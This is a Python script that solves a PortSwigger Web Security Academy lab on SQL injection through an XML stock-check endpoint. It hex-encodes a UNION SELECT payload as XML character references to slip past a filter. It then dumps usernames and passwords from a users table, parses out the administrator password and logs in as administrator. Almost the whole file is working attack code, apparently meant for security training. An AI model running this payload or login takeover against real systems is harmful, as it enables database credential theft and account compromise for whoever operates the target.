"""
Lab: SQL injection with filter bypass via XML encoding
Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-in-different-contexts/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

Description:
    This lab contains a SQL injection vulnerability in an XML-based stock check.
    A WAF/filter blocks certain SQL characters or keywords, but XML character
    references can be used to bypass the filter because the XML parser decodes
    them before the SQL query is processed.

Solution:
    1. Send the stock-check request to the exact URL supplied on the command line.
    2. Place the SQL injection in the storeId XML element.
    3. Encode the SQL payload using hexadecimal XML character references.
    4. Use a UNION SELECT expression to retrieve username and password together.
    5. Parse the administrator password from the response.
    6. Attempt to log in as administrator to verify the lab is solved.

Usage:
    python3 lab-17-sqli-xml-encoding.py https://YOUR-LAB-ID.web-security-academy.net/product/stock
    python3 lab-17-sqli-xml-encoding.py https://YOUR-LAB-ID.web-security-academy.net/product/stock -p 127.0.0.1:8080
"""

import sys
import argparse
import re
import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Lab 17 – SQLi Filter Bypass via XML Encoding                ║
║  https://portswigger.net/web-security/sql-injection          ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def build_proxies(proxy):
    if proxy:
        proxy_url = proxy if "://" in proxy else f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}
    return {}


def xml_hex_encode(value):
    """Encode each character as an XML hexadecimal character reference."""
    return "".join(f"&#x{ord(char):X};" for char in value)


def send_stock_request(url, session, product_id, store_id, proxy=None):
    """POST XML to the exact URL provided by the user; no path is appended."""
    proxies = build_proxies(proxy)
    xml_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<stockCheck>"
        f"<productId>{product_id}</productId>"
        f"<storeId>{store_id}</storeId>"
        "</stockCheck>"
    )
    headers = {"Content-Type": "application/xml", "Accept": "*/*"}
    return session.post(
        url, data=xml_body.encode("utf-8"), headers=headers,
        verify=False, proxies=proxies, timeout=15
    )


def extract_password(response_text):
    """Extract administrator password if the response contains username~password."""
    match = re.search(
        r"administrator~([A-Za-z0-9._!@#$%^&*()+=-]+)",
        response_text, re.IGNORECASE
    )
    if match:
        return match.group(1)

    # Some responses may render the separator or whitespace differently.
    match = re.search(
        r"administrator\s*~\s*([^\s<\"']+)",
        response_text, re.IGNORECASE
    )
    return match.group(1) if match else None


def login(url, password, proxy=None):
    """Log in as administrator to verify whether the lab is solved."""
    proxies = build_proxies(proxy)
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    login_url = f"{base_url}/login"

    s = requests.Session()
    r = s.get(login_url, verify=False, proxies=proxies, timeout=15)

    csrf = None
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if csrf_match:
        csrf = csrf_match.group(1)

    data = {"username": "administrator", "password": password}
    if csrf:
        data["csrf"] = csrf

    r = s.post(login_url, data=data, verify=False, proxies=proxies, timeout=15)

    if "Your username is: administrator" in r.text or "Log out" in r.text:
        print(f"{GREEN}{BOLD}[✓] Login successful! Lab solved.{RESET}")
    else:
        print(f"{YELLOW}[*] Login submitted. Check the lab page to confirm it's solved.{RESET}")


def exploit(url, proxy=None, product_id="1"):
    print(f"{YELLOW}[*] Target : {url}{RESET}")
    print(f"{YELLOW}[*] Proxy  : {proxy if proxy else 'disabled'}{RESET}\n")

    s = requests.Session()

    # Step 1 – Send a normal XML stock-check request to the exact supplied URL.
    try:
        baseline = send_stock_request(url, s, product_id, "1", proxy)
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection failed. Is the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Request failed: {exc}{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Stock endpoint responded (HTTP {baseline.status_code}).{RESET}")
    if baseline.status_code == 404:
        print(f"{RED}[✗] The exact URL returned 404. Check the direct link.{RESET}")
        print(f"{YELLOW}[*] Response: {baseline.text[:300]}{RESET}")
        sys.exit(1)

    # Step 2 – XML-encode the SQL payload and inject it in storeId.
    sql_payload = "1 UNION SELECT username || '~' || password FROM users"
    encoded_payload = xml_hex_encode(sql_payload)

    print(f"{YELLOW}[*] Sending XML-encoded SQL injection...{RESET}")
    try:
        r = send_stock_request(url, s, product_id, encoded_payload, proxy)
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Injection request failed: {exc}{RESET}")
        sys.exit(1)

    print(f"[*] HTTP status: {r.status_code}")

    # Step 3 – Extract administrator password from the response.
    password = extract_password(r.text)
    if not password:
        print(f"{RED}[✗] Could not find administrator password in response.{RESET}")
        print(f"{YELLOW}[*] Response preview (first 1500 characters):{RESET}")
        print(r.text[:1500])
        print(f"\n{YELLOW}[*] Check the XML structure and response in Burp HTTP history.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Administrator password: {password}{RESET}")

    # Step 4 – Log in as administrator.
    print(f"\n{YELLOW}[*] Logging in as administrator...{RESET}")
    login(url, password, proxy)


def main():
    parser = argparse.ArgumentParser(
        add_help=False,
        description="PortSwigger Lab 17 – SQL injection with filter bypass via XML encoding",
    )
    parser.add_argument("url", help="Full direct URL to POST the XML request to")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT")
    parser.add_argument("--product-id", default="1")

    args = parser.parse_args()
    url = args.url.rstrip("/")

    if not urlparse(url).scheme:
        url = "https://" + url

    print_banner()
    exploit(url, proxy=args.proxy, product_id=args.product_id)


if __name__ == "__main__":
    main()
